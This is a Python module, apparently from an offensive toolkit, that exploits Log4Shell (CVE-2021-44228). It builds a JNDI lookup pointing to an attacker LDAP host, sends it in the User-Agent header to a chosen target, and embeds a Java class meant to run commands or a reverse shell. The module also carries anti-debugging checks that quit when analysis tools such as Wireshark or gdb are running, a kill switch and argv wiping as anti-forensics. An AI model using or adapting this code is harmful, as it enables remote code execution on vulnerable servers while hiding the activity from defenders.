# File: modules/exploit_lib/cve_2021_44228_log4j.py

"""
Log4Shell (CVE-2021-44228) PoC:
• Builds a JNDI payload that points to an attacker LDAP server hosting a malicious Java class.
• Sends HTTP requests with the payload in common headers.
• Listens for LDAP callback or spawns a reverse shell.
"""


import logging
import socket
import threading
import http.server
import sys
import os
import subprocess
from urllib.parse import quote
from bismillah import log_event

# --- Anti-debugging: exit if under analysis ---
def is_debugger_present():
    tools = ["wireshark", "tcpdump", "strace", "gdb", "lldb", "dtruss", "Instruments", "fs_usage"]
    try:
        out = subprocess.check_output(["ps", "aux"], text=True)
        for t in tools:
            if t in out:
                return True
    except Exception:
        pass
    return False

# --- Operator kill switch (magic file) ---
def check_kill_switch():
    home = os.environ.get("HOME", "")
    return os.path.exists(os.path.join(home, ".bismillah_kill"))

logger = logging.getLogger("cve_2021_44228")

LDAP_HOST = "attacker.ldap.server"     # Change to your LDAP server
LDAP_PORT = 1389
HTTP_PORT = 8000

# Minimal Java class to spawn reverse shell or download a payload
JAVA_CLASS = """
package evil;
import java.io.IOException;
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "calc.exe"});
        } catch (IOException e) {}
    }
}
"""

def start_ldap_server(base_dn="dc=example,dc=com"):
    """
    Simple LDAP server that serves the malicious Java class when JNDI LDAP request is received.
    Uses Apache Directory API or a minimal pure‑Python LDAP responder.
    (Here we show a conceptual placeholder; in practice use 'marshalsec' or 'LogKiller'.)
    """
    # For demonstration, log that attacker should run a proper LDAP server
    logger.info(f"[Log4Shell] Start a malicious LDAP server on {LDAP_HOST}:{LDAP_PORT} serving Exploit class")

def build_payload(jndi_url: str) -> str:
    """Creates the JNDI lookup string for headers."""
    return f"${{jndi:{jndi_url}}}"

def exploit(target: str, port: int = 80, path: str = "/", headers: dict = None) -> dict:
    """
    target: e.g., "192.168.1.100"
    Builds and sends a GET request to http://target:port/path with malicious JNDI header.
    """
    # --- Anti-debugging and kill switch ---
    if is_debugger_present():
        logger.error("[!] Debugger or analysis tool detected. Exiting.")
        return {"status": "error", "detail": "Debugger detected"}
    if check_kill_switch():
        logger.error("[!] Operator kill switch present. Exiting.")
        return {"status": "error", "detail": "Operator kill switch present"}

    try:
        jndi_url = f"ldap://{LDAP_HOST}:{LDAP_PORT}/evilClass"
        payload = build_payload(jndi_url)
        # Insert payload into a common header, e.g., User-Agent
        send_headers = headers or {}
        send_headers["User-Agent"] = payload

        import requests
        url = f"http://{target}:{port}{path}"
        logger.info(f"[Log4Shell] Sending exploit to {url} with User-Agent={payload}")
        resp = requests.get(url, headers=send_headers, timeout=10)
        log_event("cve_2021_44228", f"Sent payload to {url}, status {resp.status_code}".encode())

        # --- Anti-forensics: wipe argv after execution ---
        for i in range(len(sys.argv)):
            if sys.argv[i]:
                sys.argv[i] = "\0" * len(sys.argv[i])

        return {"status": "ok", "http_status": resp.status_code}
    except Exception as e:
        logger.error(f"[Log4Shell] Exploit failed: {e}")
        return {"status": "error", "detail": str(e)}
